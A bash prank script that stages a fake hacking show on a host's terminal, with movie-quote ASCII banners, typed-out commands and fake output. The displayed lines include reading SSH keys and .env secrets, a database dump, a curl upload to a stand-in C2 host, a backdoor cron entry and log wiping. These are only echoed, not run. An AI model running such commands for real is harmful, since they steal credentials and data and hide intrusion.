#!/bin/bash
# hack-sim.sh — Visual hacking simulation for council machines
# Usage: hack-sim.sh [hostname] [ip]
# Each machine gets unique ASCII art + movie quotes based on hostname hash

HOST="${1:-$(hostname)}"
IP="${2:-127.0.0.1}"
USER_NAME="$(whoami)"

# Pick art variant based on hostname (0-7)
ART_SEED=0
for ((i=0; i<${#HOST}; i++)); do
    ART_SEED=$(( (ART_SEED + $(printf '%d' "'${HOST:$i:1}")) % 8 ))
done

# Terminal colors
G='\033[1;32m'   # Green bold
R='\033[1;31m'   # Red bold
Y='\033[1;33m'   # Yellow bold
C='\033[1;36m'   # Cyan bold
W='\033[1;37m'   # White bold
D='\033[0;32m'   # Green dim
M='\033[1;35m'   # Magenta bold
N='\033[0m'      # Reset

clear

# Play modem handshake sound in background (if modem-sound.py is available)
if [ -f /tmp/modem-sound.py ]; then
    python3 /tmp/modem-sound.py &>/dev/null &
fi

typeit() {
    local text="$1"
    local delay="${2:-0.02}"
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

prompt() {
    printf "${R}root@${HOST}${N}:${C}~# ${G}"
}

randhex() {
    cat /dev/urandom | LC_ALL=C tr -dc 'a-f0-9' | head -c "$1"
}

# ══════════════════════════════════════════════
# SCI-FI MOVIE QUOTES — big ASCII text banners
# ══════════════════════════════════════════════

show_quote_0() {
    # WarGames (1983)
    echo -e "${G}"
    cat << 'Q'
 ____  _   _    _    _     _      __        ______
/ ___|| | | |  / \  | |   | |     \ \      / / ___|
\___ \| |_| | / _ \ | |   | |      \ \ /\ / /| |
 ___) |  _  |/ ___ \| |___| |___    \ V  V / | |___
|____/|_| |_/_/   \_\_____|_____|    \_/\_/   \____|

 ____  _        _ __   __
|  _ \| |      / \\ \ / /
| |_) | |     / _ \\ V /
|  __/| |___ / ___ \| |
|_|   |_____/_/   \_\_|

     _       ____    _    __  __ _____ ___
    / \     / ___|  / \  |  \/  | ____| _ \
   / _ \   | |  _  / _ \ | |\/| |  _| |_) |
  / ___ \  | |_| |/ ___ \| |  | | |__|  __/
 /_/   \_\  \____/_/   \_\_|  |_|_____|_|    ?
Q
    echo -e "${N}"
}

show_quote_1() {
    # 2001: A Space Odyssey (1968/popularized 80s)
    echo -e "${R}"
    cat << 'Q'
 ___ _   __  __   ____   ___  ____  ______   __
|_ _( ) |  \/  | / ___| / _ \|  _ \|  _ \ \ / /
 | ||/  | |\/| | \___ \| | | | |_) | |_) \ V /
 | |    | |  | |  ___) | |_| |  _ <|  _ < | |
|___|   |_|  |_| |____/ \___/|_| \_\_| \_\|_|

 ___    ____    _    _   _ _ _____
|_ _|  / ___|  / \  | \ | ( )_   _|
 | |  | |     / _ \ |  \| |/  | |
 | |  | |___ / ___ \| |\  |   | |
|___|  \____/_/   \_\_| \_|   |_|

 ____   ___    _____ _   _    _  _____
|  _ \ / _ \  |_   _| | | |  / \|_   _|
| | | | | | |   | | | |_| | / _ \ | |
| |_| | |_| |   | | |  _  |/ ___ \| |
|____/ \___/    |_| |_| |_/_/   \_\_|    DAVE
Q
    echo -e "${N}"
}

show_quote_2() {
    # The Terminator (1984)
    echo -e "${R}"
    cat << 'Q'
 ___ _     _       ____  _____
|_ _( )   | |     | __ )| ____|
 | ||/    | |     |  _ \|  _|
 | |      | |___  | |_) | |___
|___|     |_____| |____/|_____|

 ____    _    ____ _  __
| __ )  / \  / ___| |/ /
|  _ \ / _ \| |   | ' /
| |_) / ___ \ |___| . \
|____/_/   \_\____|_|\_\
Q
    echo -e "${N}"
}

show_quote_3() {
    # Blade Runner (1982)
    echo -e "${C}"
    cat << 'Q'
 _____ ___ __  __ _____
|_   _|_ _|  \/  | ____|
  | |  | || |\/| |  _|
  | |  | || |  | | |___
  |_| |___|_|  |_|_____|

 _____ ___    ____ ___ _____
|_   _/ _ \  |  _ \_ _| ____|
  | || | | | | | | | ||  _|
  | || |_| | | |_| | || |___
  |_| \___/  |____/___|_____|

 _     ___ _  ______   _____ _____    _    ____  ____
| |   |_ _| |/ / ___| |_   _| ____|  / \  |  _ \/ ___|
| |    | || ' /| |       | | |  _|   / _ \ | |_) \___ \
| |___ | || . \| |___    | | | |___ / ___ \|  _ < ___) |
|_____|___|_|\_\\____|   |_| |_____/_/   \_\_| \_\____/

             ___ _   _   ____      _    ___ _   _
            |_ _| \ | | |  _ \    / \  |_ _| \ | |
             | ||  \| | | |_) |  / _ \  | ||  \| |
             | || |\  | |  _ <  / ___ \ | || |\  |
            |___|_| \_| |_| \_\/_/   \_\___|_| \_|
Q
    echo -e "${N}"
}

show_quote_4() {
    # Alien (1979/franchise 80s-90s)
    echo -e "${G}"
    cat << 'Q'
 ___ _   _   ____  ____   _    ____ _____
|_ _| \ | | / ___||  _ \ / \  / ___| ____|
 | ||  \| | \___ \| |_) / _ \| |   |  _|
 | || |\  |  ___) |  __/ ___ \ |___| |___
|___|_| \_| |____/|_| /_/   \_\____|_____|

 _   _  ___    ___  _   _ _____
| \ | |/ _ \  / _ \| \ | | ____|
|  \| | | | || | | |  \| |  _|
| |\  | |_| || |_| | |\  | |___
|_| \_|\___/  \___/|_| \_|_____|

  ____    _    _   _   _   _ _____    _    ____
 / ___|  / \  | \ | | | | | | ____|  / \  |  _ \
| |     / _ \ |  \| | | |_| |  _|   / _ \ | |_) |
| |___ / ___ \| |\  | |  _  | |___ / ___ \|  _ <
 \____/_/   \_\_| \_| |_| |_|_____/_/   \_\_| \_\

 __   _____  _   _   ____   ____ ____  _____    _    __  __
 \ \ / / _ \| | | | / ___| / ___|  _ \| ____|  / \  |  \/  |
  \ V / | | | | | | \___ \| |   | |_) |  _|   / _ \ | |\/| |
   | || |_| | |_| |  ___) | |___|  _ <| |___ / ___ \| |  | |
   |_| \___/ \___/  |____/ \____|_| \_\_____/_/   \_\_|  |_|
Q
    echo -e "${N}"
}

show_quote_5() {
    # Star Wars (1977-onwards)
    echo -e "${Y}"
    cat << 'Q'
  __  __    _  __   __
 |  \/  |  / \\ \ / /
 | |\/| | / _ \\ V /
 | |  | |/ ___ \| |
 |_|  |_/_/   \_\_|

 _____ _   _ _____
|_   _| | | | ____|
  | | | |_| |  _|
  | | |  _  | |___
  |_| |_| |_|_____|

 _____ ___  ____   ____ _____
| ____/ _ \|  _ \ / ___| ____|
|  _|| | | | |_) | |   |  _|
| |  | |_| |  _ <| |___| |___
|_|   \___/|_| \_\\____|_____|

 ____  _____  __        _____ _____ _   _
| __ )| ____| \ \      / /_ _|_   _| | | |
|  _ \|  _|    \ \ /\ / / | |  | | | |_| |
| |_) | |___    \ V  V /  | |  | | |  _  |
|____/|_____|    \_/\_/  |___| |_| |_| |_|

 __   _____  _   _
 \ \ / / _ \| | | |
  \ V / | | | | | |
   | || |_| | |_| |
   |_| \___/ \___/
Q
    echo -e "${N}"
}

show_quote_6() {
    # The Matrix (1999)
    echo -e "${G}"
    cat << 'Q'
 _____     _    _  __ _____
|_   _|   / \  | |/ /| ____|
  | |    / _ \ | ' / |  _|
  | |   / ___ \| . \ | |___
  |_|  /_/   \_\_|\_\|_____|

 _____ _   _ _____
|_   _| | | | ____|
  | | | |_| |  _|
  | | |  _  | |___
  |_| |_| |_|_____|

 ____  _____ ____    ____  ___ _     _
|  _ \| ____|  _ \  |  _ \|_ _| |   | |
| |_) |  _| | | | | | |_) || || |   | |
|  _ <| |___| |_| | |  __/ | || |___| |___
|_| \_\_____|____/  |_|   |___|_____|_____|

 _   _ _____ ___
| \ | | ____/ _ \
|  \| |  _|| | | |
| |\  | |__| |_| |
|_| \_|_____\___/
Q
    echo -e "${N}"
}

show_quote_7() {
    # Tron (1982)
    echo -e "${C}"
    cat << 'Q'
  ____ ____  _____ _____ _____ ___ _   _  ____ ____
 / ___|  _ \| ____| ____|_   _|_ _| \ | |/ ___/ ___|
| |  _| |_) |  _| |  _|   | |  | ||  \| | |  _\___ \
| |_| |  _ <| |___| |___  | |  | || |\  | |_| |___) |
 \____|_| \_\_____|_____| |_| |___|_| \_|\____|____/

 _____ ____   ___  __  __
|  ___|  _ \ / _ \|  \/  |
| |_  | |_) | | | | |\/| |
|  _| |  _ <| |_| | |  | |
|_|   |_| \_\\___/|_|  |_|

 _____ _   _ _____
|_   _| | | | ____|
  | | | |_| |  _|
  | | |  _  | |___
  |_| |_| |_|_____|

  ____ ____  ___ ____
 / ___|  _ \|_ _|  _ \
| |  _| |_) || || | | |
| |_| |  _ < | || |_| |
 \____|_| \_\___|____/
Q
    echo -e "${N}"
}

# Pick which quote to show based on seed
show_movie_quote() {
    case $(( ($1) % 8 )) in
        0) show_quote_0 ;;  # WarGames
        1) show_quote_1 ;;  # 2001
        2) show_quote_2 ;;  # Terminator
        3) show_quote_3 ;;  # Blade Runner
        4) show_quote_4 ;;  # Alien
        5) show_quote_5 ;;  # Star Wars
        6) show_quote_6 ;;  # Matrix
        7) show_quote_7 ;;  # Tron
    esac
}

# ══════════════════════════════════════════════
# 8 unique ASCII art pieces — one per machine
# ══════════════════════════════════════════════

show_art_0() {
    # Skull
    echo -e "${R}"
    cat << 'ART'
         _______________
        /               \
       /                 \
      |   XXXX     XXXX   |
      |   XXXX     XXXX   |
      |   XXX       XXX   |
      |         X         |
      \__      XXX     __/
        |\     XXX     /|
        | |           | |
        | I I I I I I I |
        |  I I I I I I  |
         \_           _/
           \_________/
ART
    echo -e "${N}"
}

show_art_1() {
    # Ghost / Spectre
    echo -e "${G}"
    cat << 'ART'
            .-"""-.
           /        \
          |  O    O  |
          |    __    |
          |   /  \   |
           \  '=='  /
            '------'
           /  /()\  \
          /  / /  \ \  \
         (  ( (    ) )  )
          \  \ \  / /  /
           \  /()\  /
            '-....-'
    >>> SPECTER INSIDE <<<
ART
    echo -e "${N}"
}

show_art_2() {
    # Lock broken
    echo -e "${Y}"
    cat << 'ART'
        .---------.
       / .------. \
      / /        \ \
      | |        | |
      | |        |/
      \ \        /
       \ '------'
        '----+----'
        |  .-"-.  |
        | /     \ |
        ||       ||
        ||  |||  ||
        | \ ||| / |
        |  '-+-'  |
        '---------'
   >>> LOCK BYPASSED <<<
ART
    echo -e "${N}"
}

show_art_3() {
    # Eye of surveillance
    echo -e "${C}"
    cat << 'ART'
              .-""""""-.
           .'          '.
          /   O      O   \
         :                :
         |                |
         : ',          ,' :
          \  '-......-'  /
           '.          .'
             '-......-'
          /  |  \  /  |  \
         '   |   ''   |   '
     >>> ALL SEEING EYE <<<
ART
    echo -e "${N}"
}

show_art_4() {
    # Bomb
    echo -e "${R}"
    cat << 'ART'
             _.-^^---....,,--
         _--                  --_
        <       LOGIC BOMB       >
         |    ARMED & READY     |
          \._                 _./
             ```--. . , ; .--'''
                   | |   |
                .-=||  | |=-.
                `-=#$%&%$#=-'
                   | ;  :|
          _____.,-#%&$@%#&#~,._____
ART
    echo -e "${N}"
}

show_art_5() {
    # Trojan horse
    echo -e "${M}"
    cat << 'ART'
                   >>\.
                  /_  )`.
                 /  _)`^)`.   _.---._
                (_,' \  `^-)""      `.\\
                      |  | \         | |
                      \  / .|       /  /
                      / /  | |   .' .'
                     / /   \ \_.' .'
                    ( (     \  __.'
                     \ \     '|
                      \ \     |
                       \ \    |
                        ) )   |
                       / /    |
            >>>  TROJAN HORSE  <<<
ART
    echo -e "${N}"
}

show_art_6() {
    # Spider / web crawler
    echo -e "${G}"
    cat << 'ART'
           /\  .-"""-.  /\
          //\\/  ,,,  \//\\
          |/\| ,;;;;;, |/\|
          //\\\;-"""-;///\\
         //  \/   .   \/  \\
        (| ,-_| \ | / |_-, |)
          //`__\.-.-./__`\\
         // /.-( \___/ )-.\\ \\
        (\ |)   '---'   (| /)
         ` (|           |) `
           \)           (/
    >>> WEB CRAWLER ACTIVE <<<
ART
    echo -e "${N}"
}

show_art_7() {
    # Ransomware padlock
    echo -e "${Y}"
    cat << 'ART'
        ╔═══════════════════╗
        ║   ┌───────────┐   ║
        ║   │  RANSOM    │   ║
        ║   │  ████████  │   ║
        ║   │  ██ $$ ██  │   ║
        ║   │  ████████  │   ║
        ║   │  WARE  v3  │   ║
        ║   └───────────┘   ║
        ║                   ║
        ║  PAY 5 BTC OR     ║
        ║  LOSE EVERYTHING  ║
        ║                   ║
        ║  ₿ 1A1zP1...QGefi ║
        ╚═══════════════════╝
ART
    echo -e "${N}"
}

show_ascii_art() {
    case $ART_SEED in
        0) show_art_0 ;; 1) show_art_1 ;; 2) show_art_2 ;; 3) show_art_3 ;;
        4) show_art_4 ;; 5) show_art_5 ;; 6) show_art_6 ;; 7) show_art_7 ;;
    esac
}

show_mid_art() {
    case $(( (ART_SEED + 4) % 8 )) in
        0) show_art_0 ;; 1) show_art_1 ;; 2) show_art_2 ;; 3) show_art_3 ;;
        4) show_art_4 ;; 5) show_art_5 ;; 6) show_art_6 ;; 7) show_art_7 ;;
    esac
}

# ══════════════════════════════════════════════
# PHASE 1: Initial breach + MOVIE QUOTE
# ══════════════════════════════════════════════

show_movie_quote $ART_SEED
sleep 1.5

echo -e "${R}[!] INTRUSION DETECTED — ${HOST} (${IP})${N}"
echo -e "${D}$(date '+%Y-%m-%d %H:%M:%S') — Unauthorized access initiated${N}"
echo
sleep 0.5

prompt; typeit "ssh -o StrictHostKeyChecking=no root@${IP}" 0.03
echo -e "${D}Connecting to ${IP}:22...${N}"
sleep 0.3
echo -e "${D}Authenticating with stolen RSA key...${N}"
sleep 0.5
echo -e "${G}ACCESS GRANTED${N}"
echo
sleep 0.3

# ══════════════════════════════════════════════
# PHASE 2: System recon
# ══════════════════════════════════════════════

prompt; typeit "uname -a" 0.02
echo -e "${D}Darwin ${HOST} 24.4.0 Darwin Kernel Version 24.4.0 RELEASE_ARM64_T8103 arm64${N}"
echo
sleep 0.2

prompt; typeit "whoami && id" 0.02
echo -e "${G}root${N} uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon)"
echo
sleep 0.2

prompt; typeit "cat /etc/passwd | head -5" 0.02
echo -e "${D}root:*:0:0:System Administrator:/var/root:/bin/zsh"
echo -e "daemon:*:1:1:System Services:/var/root:/usr/bin/false"
echo -e "${USER_NAME}:*:501:20:${USER_NAME}:/Users/${USER_NAME}:/bin/zsh${N}"
echo
sleep 0.3

# ══════════════════════════════════════════════
# PHASE 3: Network scan
# ══════════════════════════════════════════════

prompt; typeit "netstat -an | grep LISTEN | head -8" 0.02
echo -e "${D}tcp4  0  0  *.22        *.*   LISTEN"
echo -e "tcp4  0  0  *.443       *.*   LISTEN"
echo -e "tcp4  0  0  *.3030      *.*   LISTEN"
echo -e "tcp4  0  0  *.5900      *.*   LISTEN${N}"
echo
sleep 0.3

# ── Mid-phase art ──
show_mid_art
sleep 0.5

# ── Second movie quote (different from first) ──
show_movie_quote $((ART_SEED + 3))
sleep 1

# ══════════════════════════════════════════════
# PHASE 4: Data exfiltration
# ══════════════════════════════════════════════

prompt; typeit "find /Users/${USER_NAME} -name '*.key' -o -name '*.pem' -o -name '*.env' 2>/dev/null" 0.02
echo -e "${D}/Users/${USER_NAME}/.ssh/id_ed25519"
echo -e "/Users/${USER_NAME}/.ssh/id_rsa"
echo -e "/Users/${USER_NAME}/projects/.env.production${N}"
echo
sleep 0.3

prompt; typeit "cat /Users/${USER_NAME}/.ssh/id_ed25519" 0.02
echo -e "${Y}-----BEGIN OPENSSH PRIVATE KEY-----"
echo -e "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA$(randhex 20)"
echo -e "$(randhex 70)"
echo -e "$(randhex 70)"
echo -e "$(randhex 40)=="
echo -e "-----END OPENSSH PRIVATE KEY-----${N}"
echo
sleep 0.5

prompt; typeit "cat /Users/${USER_NAME}/projects/.env.production" 0.02
echo -e "${R}DB_HOST=db.admira-internal.com"
echo -e "DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
echo -e "API_KEY=sk-ant-api03-$(randhex 32)..."
echo -e "STRIPE_SECRET=sk_live_$(randhex 24)${N}"
echo
sleep 0.5

# ══════════════════════════════════════════════
# PHASE 5: Lateral movement
# ══════════════════════════════════════════════

prompt; typeit "echo 'Scanning internal Tailscale network...'" 0.02
echo
for target_ip in 100.99.176.126 100.101.192.1 100.114.113.88 100.74.101.14 100.75.118.75 100.84.81.45 100.121.18.12 100.110.80.2; do
    if [ "$target_ip" != "$IP" ]; then
        echo -e "${D}  Probing ${target_ip}...${N} ${G}VULNERABLE${N}"
        sleep 0.15
    fi
done
echo
sleep 0.3

prompt; typeit "mysqldump -h db.admira-internal.com --all-databases > /tmp/exfil.sql" 0.03
echo -e "${D}Dumping database 'admira_production'... ${G}OK${D} (142 tables)"
echo -e "Dumping database 'council_members'... ${G}OK${D} (38 tables)"
echo -e "Dumping database 'financial_records'... ${G}OK${D} (67 tables)"
echo -e "${Y}[+] Total: 247 tables, 891MB exported${N}"
echo
sleep 0.5

prompt; typeit "curl -X POST https://c2.darknet.onion/exfil -F 'data=@/tmp/exfil.sql'" 0.02
echo -e "${D}Uploading to C2 server..."
for pct in 10 25 40 55 70 85 100; do
    printf "\r${G}  ["; printf '%0.s=' $(seq 1 $((pct/5))); printf '%0.s ' $(seq 1 $((20-pct/5))); printf "] ${pct}%%${N}"
    sleep 0.2
done
echo
echo -e "${G}[+] Upload complete — 891MB exfiltrated${N}"
echo
sleep 0.5

# ── Third movie quote ──
show_movie_quote $((ART_SEED + 5))
sleep 1

# ══════════════════════════════════════════════
# PHASE 6: Persistence + cover tracks
# ══════════════════════════════════════════════

prompt; typeit "crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.b4ckd00r.sh' | crontab -" 0.02
echo -e "${D}Backdoor cron installed${N}"
echo
sleep 0.2

prompt; typeit "history -c && echo '' > ~/.zsh_history && rm -f /var/log/system.log" 0.02
echo -e "${D}Tracks cleared${N}"
echo
sleep 0.5

# ══════════════════════════════════════════════
# FINALE — unique art per machine
# ══════════════════════════════════════════════

show_ascii_art
echo
echo -e "${R}  ╔══════════════════════════════════════════════╗${N}"
echo -e "${R}  ║                                              ║${N}"
printf  "${R}  ║  ${W}TARGET: ${G}%-36s${R}  ║${N}\n" "${HOST}"
printf  "${R}  ║  ${W}IP:     ${G}%-36s${R}  ║${N}\n" "${IP}"
echo -e "${R}  ║  ${W}STATUS: ${Y}FULLY COMPROMISED                ${R}  ║${N}"
echo -e "${R}  ║  ${W}DATA:   ${Y}891MB EXFILTRATED                ${R}  ║${N}"
echo -e "${R}  ║                                              ║${N}"
echo -e "${R}  ╚══════════════════════════════════════════════╝${N}"
echo

# Infinite matrix rain effect
echo -e "${G}"
while true; do
    line=""
    for ((i=0; i<$(tput cols); i++)); do
        r=$((RANDOM % 4))
        if [ $r -eq 0 ]; then
            line+="$(printf '%x' $((RANDOM % 16)))"
        elif [ $r -eq 1 ]; then
            line+=" "
        elif [ $r -eq 2 ]; then
            chars="01アイウエオカキクケコ@#$%&"
            line+="${chars:$((RANDOM % ${#chars})):1}"
        else
            line+="$(printf '%x' $((RANDOM % 256)))"
        fi
    done
    echo "$line"
    sleep 0.05
done
